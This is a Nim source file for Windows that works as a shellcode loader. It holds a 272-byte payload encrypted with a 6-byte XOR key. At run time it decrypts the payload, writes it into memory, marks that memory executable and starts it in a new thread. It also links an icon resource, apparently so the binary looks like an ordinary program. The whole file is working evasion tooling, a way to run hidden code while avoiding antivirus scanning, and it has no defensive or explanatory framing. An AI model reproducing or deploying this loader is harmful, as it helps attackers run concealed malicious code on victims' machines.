import winim/lean


proc xorEncrypt[I, J, byte](code: array[I, byte], key: array[J, byte]): array[I, byte] =
  var result: array[I, byte]
  for i in 0 ..< code.len:
    result[i] = code[i] xor key[i mod key.len]
  return result

proc Ldr1[I, T](shellcode: array[I, T]): void =

    let tProcess = GetCurrentProcessId()
    var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_READWRITE
    )
    var key: array[6, byte] = [byte  0x6d, 0x46, 0x51, 0x4b, 0x4d, 0x65 ]

    var shellcode: array[272, byte] = xorEncrypt(shellcode, key)

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    var oldProtect: DWORD
    let rv = VirtualProtect(rPtr, shellcode.len, PAGE_EXECUTE_READ, cast[PDWORD](addr(oldProtect)))

    if rv != 0:
        var tHandle = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](rPtr), nil, 0, nil)
        WaitForSingleObject(tHandle, -1)

when defined(windows):

    var shellcode: array[272, byte] = [
        byte 0x91, 0xe, 0xd2, 0xaf, 0xbd, 0x8d, 0xad, 0x46, 0x51, 0x4b, 0xc, 0x34, 0x2c, 0x16, 0x3, 0x1a, 0x1b, 0x2d, 0x5c, 0x94, 0x34, 0x3, 0xc6, 0x37, 0xd, 0xe, 0xda, 0x19, 0x55, 0x2d, 0xe6, 0x14, 0x71, 0x3, 0xc6, 0x17, 0x3d, 0xe, 0x5e, 0xfc, 0x7, 0x2f, 0x20, 0x77, 0x98, 0x3, 0x7c, 0xa5, 0xc1, 0x7a, 0x30, 0x37, 0x4f, 0x49, 0x4d, 0x7, 0x90, 0x82, 0x40, 0x24, 0x6c, 0x87, 0xb3, 0xa6, 0x1f, 0x24, 0x3c, 0xe, 0xda, 0x19, 0x6d, 0xee, 0x2f, 0x7a, 0x19, 0x4a, 0x9d, 0xee, 0xed, 0xce, 0x51, 0x4b, 0x4d, 0x2d, 0xe8, 0x86, 0x25, 0x2c, 0x5, 0x64, 0xbd, 0x16, 0xda, 0x3, 0x55, 0x21, 0xe6, 0x6, 0x71, 0x2, 0x4c, 0xb5, 0x8e, 0x10, 0x19, 0xb4, 0x84, 0x24, 0xe6, 0x72, 0xd9, 0x3, 0x4c, 0xb3, 0x20, 0x77, 0x98, 0x3, 0x7c, 0xa5, 0xc1, 0x7, 0x90, 0x82, 0x40, 0x24, 0x6c, 0x87, 0x69, 0xab, 0x38, 0x94, 0x21, 0x45, 0x1d, 0x6f, 0x45, 0x20, 0x54, 0x97, 0x24, 0x93, 0x15, 0x21, 0xe6, 0x6, 0x75, 0x2, 0x4c, 0xb5, 0xb, 0x7, 0xda, 0x47, 0x5, 0x21, 0xe6, 0x6, 0x4d, 0x2, 0x4c, 0xb5, 0x2c, 0xcd, 0x55, 0xc3, 0x5, 0x64, 0xbd, 0x7, 0x9, 0xa, 0x15, 0x3b, 0x34, 0x1c, 0x10, 0x13, 0xc, 0x3c, 0x2c, 0x1c, 0x19, 0xc8, 0xa1, 0x45, 0x2c, 0x14, 0xae, 0xab, 0x15, 0x24, 0x34, 0x1c, 0x19, 0xc0, 0x5f, 0x8c, 0x3a, 0xb9, 0xae, 0xb4, 0x10, 0x2d, 0xd7, 0x47, 0x51, 0x4b, 0x4d, 0x65, 0x6d, 0x46, 0x51, 0x3, 0xc0, 0xe8, 0x6c, 0x47, 0x51, 0x4b, 0xc, 0xdf, 0x5c, 0xcd, 0x3e, 0xcc, 0xb2, 0xb0, 0xd6, 0xb6, 0xe4, 0xe9, 0x1b, 0x24, 0xd7, 0xe0, 0xc4, 0xf6, 0xd0, 0x9a, 0xb8, 0xe, 0xd2, 0x8f, 0x65, 0x59, 0x6b, 0x3a, 0x5b, 0xcb, 0xb6, 0x85, 0x18, 0x43, 0xea, 0xc, 0x5e, 0x17, 0x2, 0x2c, 0x51, 0x12, 0xc, 0xec, 0xb7, 0xb9, 0x84, 0x28, 0x2c, 0x9, 0xe, 0x46 ]

    when isMainModule:
        {.link: "icon.o".}
        Ldr1(shellcode)
